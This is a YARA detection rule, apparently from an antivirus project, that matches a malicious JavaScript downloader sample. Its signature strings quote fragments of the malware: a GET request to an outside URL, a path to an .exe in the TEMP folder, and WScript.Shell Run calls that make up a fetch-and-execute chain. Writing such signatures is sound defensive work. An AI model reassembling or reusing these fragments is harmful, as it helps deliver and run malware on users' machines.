rule sig_20160328_a4e0d34447d142b3f218003738aeb408 {
  meta:
    description = "datamaliciousorder - file 20160328_a4e0d34447d142b3f218003738aeb408.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "fc880e906ca8be505155e2b1f8d35aac4c3b5482c8c980772dc85ba30c9343a2"

  strings:
    $s1  = "function Nizbw() {return Djojamktfn[\"ExpandEnvironmentStrings\"](\"%TEMP%/\") + \"egwGRcYYq.exe\";};" fullword ascii
    $s2  = "do {WScript[Mbsislmpte](Kuyogkp() * 11)} while (Lcevjq[\"readystate\"] < 4 );" fullword ascii
    $s3  = "function Piwty(Gnixt, Jnxycqwzxd){return Gnixt - Jnxycqwzxd;};" fullword ascii
    $s4  = "Lcevjq[Fesgfe](\"GET\", \"http://www.europaklasse-lbk.de/p4iska\", false);" fullword ascii
    $s5  = "var Djojamktfn = function Jcrpvgfrd() {return WScript[Nvhscw](\"WScript.Shell\");}();" fullword ascii
    $s6  = "function Rdaxq() {return ((Avkxm == true) && (Avkxm == Hugnyoz)) ? 1 : Skrdsk;};" fullword ascii
    $s7  = "function Exodcto(Ncgkcmr){Djojamktfn[\"Run\"](Ncgkcmr, Skrdsk, Skrdsk);};" fullword ascii
    $s8  = "Hugnyoz = true; " fullword ascii
    $s9  = "var Qtaklq = new this[\"Date\"]();" fullword ascii
    $s10 = "function Mbetile()" fullword ascii
    $s11 = " while (Rnhlw){" fullword ascii
    $s12 = "var Hugnyoz = false;" fullword ascii
    $s13 = "function Kuyogkp(){return 22;};" fullword ascii
    $s14 = "function Kycxlwgev(){return Fcclfqn;};" fullword ascii
    $s15 = "function Mtrkx(Miywymcmx) {var Uupdbvk = (1, 2, 3, 4, 5, Miywymcmx); return Uupdbvk;};" fullword ascii
    $s16 = "var Skcfbwaux = false;" fullword ascii
    $s17 = "function Jkhwht(){return Nvhscw;};" fullword ascii
    $s18 = "var Avkxm = false;" fullword ascii
    $s19 = "Avkxm = true; " fullword ascii
    $s20 = "return Piwty(Qikrkfbf, Vtuepukwes);" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}